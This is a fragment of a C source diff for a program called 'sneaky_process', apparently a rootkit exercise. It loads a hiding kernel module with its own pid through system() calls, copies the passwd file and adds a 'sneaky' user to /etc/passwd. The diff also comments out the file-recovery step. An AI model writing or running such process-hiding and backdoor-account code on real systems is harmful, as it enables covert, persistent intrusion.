@@ -33,13 +33,13 @@ void recover_file() {
 
 void load_module(long int pid) {
   char insmod_call[100];
-  sprintf(insmod_call, "/usr/sbin/insmod sneaky_mod.ko pid=%ld", pid);
+  sprintf(insmod_call, "insmod sneaky_mod.ko pid=%ld", pid);
   system(insmod_call);
   printf("%s\n", insmod_call);
 }
 
 void unload_module() {
-  system("/usr/sbin/rmmod sneaky_mod");
+  system("rmmod sneaky_mod");
   printf("remove the module\n");
 }
 
@@ -59,7 +59,7 @@ int main(void) {
   long int pid = getpid();
   printf("sneaky_process pid = %ld\n", pid);
   //copy the passwd file
-  recover_file();
+  //recover_file();
   cp_file();
   //Line to be added into /etc/passwd is
   add_sneaky_user();
